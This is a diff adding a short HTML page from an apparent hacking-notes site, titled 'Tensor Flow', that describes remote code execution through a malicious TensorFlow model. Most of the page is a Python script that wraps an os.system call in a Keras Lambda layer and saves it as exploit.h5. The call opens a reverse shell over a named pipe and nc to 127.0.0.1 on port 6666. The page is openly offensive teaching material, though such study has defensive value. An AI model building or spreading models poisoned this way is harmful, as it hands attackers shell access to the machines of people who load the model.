@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Maven+Pro:wght@400..900&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="/H4ckV4ult/styles/navBarStyles.css">
+    <link rel="stylesheet" href="/H4ckV4ult/styles/walkthroughs.css">
+        <link href="/H4ckV4ult/styles/prism/prism.css" rel="stylesheet" />
+    <script src="/H4ckV4ult/styles/prism/prism.js"></script>
+    <title>Minimalist Webpage</title>
+
+</head>
+<body>
+    <div id="navbar-container"></div>
+    <script src="/H4ckV4ult/components/navbar.js"></script>
+
+    <div class="notion-container">
+        <div class="notion-header">
+            <h1>Tensor Flow</h1>
+            <p>An open-source platform developed by Google for machine learning and artificial intelligence</p>
+        </div>
+        <div class="notion-body">
+        <h2>Exploitation</h2>
+        <ul>
+        <h3>Remote code execution</h3>
+            <p>TensorFlow models are programs which TensorFlow's runtime interprets adn executes, so we can take advantage of it by embedding malicious code.</p>
+            <p>Lamda layer allows to wrap arbitrary python expresions as a Layer object which can interact with the rest of the model. The following code creates a reverse shell. More info <a class="notion-link" href="https://splint.gitbook.io/cyberblog/security-research/tensorflow-remote-code-execution-with-malicious-model">Here</a></p>
+
+            <pre><code class="language-python">import tensorflow as tf
+
+    def exploit(x):
+        import os
+        os.system("rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc 127.0.0.1 6666 >/tmp/f")
+        return x
+
+    model = tf.keras.Sequential()
+    model.add(tf.keras.layers.Input(shape=(64,)))
+    model.add(tf.keras.layers.Lambda(exploit))
+    model.compile()
+    model.save("exploit.h5")</code></pre>
+        </ul>
+        </div>
+    </div>
+
+
+</body>
+</html>
